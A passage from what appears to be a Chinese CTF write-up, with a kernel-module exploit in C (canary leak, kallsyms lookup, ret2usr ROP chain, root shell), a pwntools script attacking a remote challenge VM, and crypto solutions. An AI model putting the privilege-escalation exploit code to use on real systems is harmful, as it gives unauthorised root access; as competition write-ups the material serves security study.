class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff8107a4d4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRETQ 0xffffffff8103b82b</span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss,ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Status has been saved.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootPrivilige</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> * (*prepare_kernel_cred_ptr)(<span class="keyword">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">int</span> (*commit_creds_ptr)(<span class="keyword">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Failed to get the root!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]Successful to get the root. Execve root shell now...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/test&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the file: /dev/test !\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    FILE* sym_table_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> offset = commit_creds<span class="number">-0xffffffff810ccc30</span>;</span><br><span class="line">    <span class="comment">/*找出canary*/</span></span><br><span class="line">    read(fd,tmp,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">size_t</span> canary = *(<span class="keyword">size_t</span>*)tmp;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] canary find: %llx&quot;</span>,(<span class="keyword">long</span> <span class="keyword">long</span>)canary);</span><br><span class="line">    <span class="comment">/*构造ROP链ret2usr*/</span></span><br><span class="line">    <span class="keyword">size_t</span> rop_chain[<span class="number">0x100</span>],i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        rop_chain[i] = canary;</span><br><span class="line">    rop_chain[i++] = (<span class="keyword">size_t</span>)getRootPrivilige;</span><br><span class="line">    rop_chain[i++] = SWAPGS_POP_RBP_RET + offset;</span><br><span class="line">    rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[i++] = IRETQ + offset;</span><br><span class="line">    rop_chain[i++] = (<span class="keyword">size_t</span>)getRootShell;</span><br><span class="line">    rop_chain[i++] = user_cs;</span><br><span class="line">    rop_chain[i++] = user_rflags;</span><br><span class="line">    rop_chain[i++] = user_sp;</span><br><span class="line">    rop_chain[i++] = user_ss;</span><br><span class="line">    write(fd,rop_chain,<span class="number">0x100</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次实战做kernel题，原来打远程那么恶心和麻烦，搞了半天（</p><h2 id="vmbyhrp"><a href="#vmbyhrp" class="headerlink" title="vmbyhrp"></a>vmbyhrp</h2><p>思路是进root然后读入flag，退出root然后输出flag。</p><p>首先是进root，需要覆盖掉bss上面的变量users和group。这里的思路是用HRP_OPEN这个函数。首先创建32个文件，对于这些文件的相关描述是放在bss上面的，所以会溢出到users和group，由该文件的输出权限的变量覆盖，通过HRP_OPEN修改相应文件的权限即可把user和group变为0</p><p><img src="https://s2.loli.net/2023/01/02/ykVt4IE5LCdO982.png" alt=""></p><p>进root之后读入flag创建为一个文件，然后退出root。不过这里有个问题是相应管理文件名的变量会被置为0(原因是执行了<code>strncpy(dest, src, 8uLL);</code>，而这个全局变量dest正好是某个FIle存其File Name指针的地方)导致运行命令循环查找文件名时候引用一个0地址处的值出现异常</p><p><img src="https://s2.loli.net/2023/01/02/1vLFw3bpqaTtgKc.png" alt=""></p><p>而这个地方恰好是login的时候输入的HOLDER的值，所以这里的想法是先mmap一块合法地址，然后reboot把合法地址填入相应地址，防止查找文件名出现错误</p><p>最后用相同的思路把flag文件的权限改一改然后cat输出即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./HRPVM&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;223.112.5.156&quot;</span>,<span class="number">58203</span>)</span><br><span class="line"><span class="comment">#context.log_level=&quot;INFO&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    name = <span class="string">&quot;HRPHRP&quot;</span></span><br><span class="line">    passwd = <span class="string">&quot;PWNME&quot;</span></span><br><span class="line">    <span class="comment">#io.recvuntil(&quot;USER NAME:&quot;)</span></span><br><span class="line">    io.sendline(name)</span><br><span class="line">    <span class="comment">#io.recvuntil(&quot;PASSWORD:&quot;)</span></span><br><span class="line">    io.sendline(passwd)</span><br><span class="line">    <span class="comment">#io.recvuntil(&quot;[+]HOLDER:&quot;)</span></span><br><span class="line">    io.sendline(p64(<span class="number">0x333333333000</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_file</span>(<span class="params">file_name,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;HRP-MACHINE$&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;FILE NAME: &quot;</span>,file_name)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;FILE CONTENT: &quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;HRP-MACHINE$&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;./&quot;</span>+file_name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;HRP-MACHINE$&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;cat &#x27;</span>+file_name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    io.sendline(<span class="string">&quot;rm &quot;</span>+file_name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root</span>():</span></span><br><span class="line">    code = <span class="string">b&#x27;mov rdi,35;mov rsi,0;call open,2&#x27;</span></span><br><span class="line">    create_file(<span class="string">&quot;toroot&quot;</span>,code)</span><br><span class="line">    run(<span class="string">&quot;toroot&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;HRP-MACHINE$&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_flag</span>():</span></span><br><span class="line">    io.sendline(<span class="string">&quot;file input&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;FILE NAME:&quot;</span>,<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mmap</span>(<span class="params">addr</span>):</span></span><br><span class="line">    io.sendline(<span class="string">&quot;mmap&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;[+]ADDR EXPEND:&quot;</span>)</span><br><span class="line">    io.sendline(str(addr))</span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;mov rdi,37;mov rsi,1001;call open,2&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    create_file(str(i),payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">root()</span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">load_flag()</span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">mmap(<span class="number">0x333333333000</span>)</span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;[+][DEBUGING]root#&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;HRP-MACHINE$&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;reboot&quot;</span>)</span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">login()</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment"># run(&quot;1&quot;)</span></span><br><span class="line"><span class="comment"># io.sendline(&quot;cat ./flag&quot;)</span></span><br><span class="line"><span class="comment"># io.interactive()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>虽然已经结束了在Crypto的生涯，不过偶尔还是会看看然后恰点烂分(x)</p><h2 id="cat’s-gift"><a href="#cat’s-gift" class="headerlink" title="cat’s gift"></a>cat’s gift</h2><p>这个级数的结果是$ \frac{\pi}{4} $ ，所以答案是pie，包上即可</p><h2 id="cat-theory"><a href="#cat-theory" class="headerlink" title="cat_theory"></a>cat_theory</h2><p>考察同态性</p><script type="math/tex; mode=display">E(m_1+m_2) = c_1*c_2</script><p>所以</p><script type="math/tex; mode=display">m_1+m_2 = D(c_1*c_2)</script><p>三个加一块除以二即可</p><h2 id="盖茨比"><a href="#盖茨比" class="headerlink" title="盖茨比"></a>盖茨比</h2><p>可以解出</p><script type="math/tex; mode=display">xor(m_i,m_{i-1})</script><p>考虑到pad的格式，通过爆破可以知道最后一串明文是这样形式的’aaaaa\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b’，这样递推反着解密回去，可以解密每16个字符的后11个字符，然后通过前后文心灵感应猜出一串完整字符，解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> copy</span><br><span class="line">table = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ,&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span></span><br><span class="line">c = <span class="string">b&#x27;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&#x27;</span></span><br><span class="line"></span><br><span class="line">key = b64decode(key)</span><br><span class="line">c = b64decode(c)</span><br><span class="line"><span class="comment">#print(len(c))</span></span><br><span class="line"><span class="comment">#print(key)</span></span><br><span class="line">cipher = AES.new(key,mode=AES.MODE_ECB)</span><br><span class="line">xor_text = cipher.decrypt(c)</span><br><span class="line">s = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>,len(c),<span class="number">16</span>):</span><br><span class="line">    s+= xor(xor_text[i:i+<span class="number">16</span>],c[i<span class="number">-16</span>:i])</span><br><span class="line">print(s[<span class="number">-16</span>:])</span><br><span class="line">x=<span class="string">b&#x27;aaaaa\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br><span class="line">msg = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">this_s = <span class="string">b&#x27;\nBut a human bra&#x27;</span></span><br><span class="line">msg = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">16</span>):</span><br><span class="line">    <span class="comment">#print(s[i:i+16])</span></span><br><span class="line">    this_s = xor(s[i:i+<span class="number">16</span>],this_s)</span><br><span class="line">    msg+=this_s</span><br><span class="line">print(msg)</span><br></pre></td></tr></table></figure><h2 id="DDH-GAME"><a href="#DDH-GAME" class="headerlink" title="DDH_GAME"></a>DDH_GAME</h2><p>阶给了，把这个点的群转换成一个较小阶的群计算DLP即可。具体来说就是同乘一个因子</p><p>DLP的计算可以采用类似bsgs算法，不过我总感觉sage里面的dlp算法没有考虑阶给定的情况感觉很慢，这里偷懒就没用bsgs的思想而是直接爆破，时间勉强可以接受</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;DDH_instances.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    test = f.read()</span><br><span class="line">test = eval(test)</span><br><span class="line">magic = <span class="number">11</span> * <span class="number">10177</span> *<span class="number">859267</span> * <span class="number">52437899</span>* <span class="number">52435875175126190479447740508185965837690552500527637822603658699938581184513</span>*<span class="number">3</span></span><br><span class="line">choice_order = <span class="number">10177</span></span><br><span class="line">magic = magic//choice_order</span><br><span class="line"></span><br><span class="line"><span class="comment">#此时群的阶为order</span></span><br><span class="line">p = <span class="number">0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab</span></span><br><span class="line">K = GF(p)</span><br><span class="line">a = K(<span class="number">0x00</span>)</span><br><span class="line">b = K(<span class="number">0x04</span>)</span><br><span class="line">E = EllipticCurve(K, (a, b))</span><br><span class="line">E.set_order(<span class="number">0x73EDA753299D7D483339D80809A1D80553BDA402FFFE5BFEFFFFFFFF00000001</span> * <span class="number">0x396C8C005555E1568C00AAAB0000AAAB</span>)</span><br><span class="line">G = E(<span class="number">3745324820672390389968901155878445437664963280229755729082200523555105705468830220374025474630687037635107257976475</span>, <span class="number">2578846078515277795052385204310204126349387494123866919108681393764788346607753607675088305233984015170544920715533</span>)</span><br><span class="line">n = G.order()</span><br><span class="line"></span><br><span class="line">new_G = G*magic</span><br><span class="line"></span><br><span class="line">new_order = new_G.order()</span><br><span class="line">print(<span class="string">f&quot;choice_order = <span class="subst">&#123;new_order&#125;</span>&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bru_dlp</span>(<span class="params">P</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(new_order):</span><br><span class="line">        <span class="keyword">if</span>(i*new_G==P):</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">msg = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(test)):</span><br><span class="line">    print(i)</span><br><span class="line">    tmp = test[i]</span><br><span class="line">    aG = magic*E(tmp[<span class="number">0</span>])</span><br><span class="line">    bG = magic*E(tmp[<span class="number">1</span>])</span><br><span class="line">    cG = magic*E(tmp[<span class="number">2</span>])</span><br><span class="line">    a = bru_dlp(aG)</span><br><span class="line">    b = bru_dlp(bG)</span><br><span class="line">    c = bru_dlp(cG)</span><br><span class="line">    <span class="keyword">if</span>((a*b)%new_order==c):</span><br><span class="line">        msg.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg.append(<span class="number">0</span>)</span><br><span class="line">    print(msg)</span><br><span class="line">print(msg)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
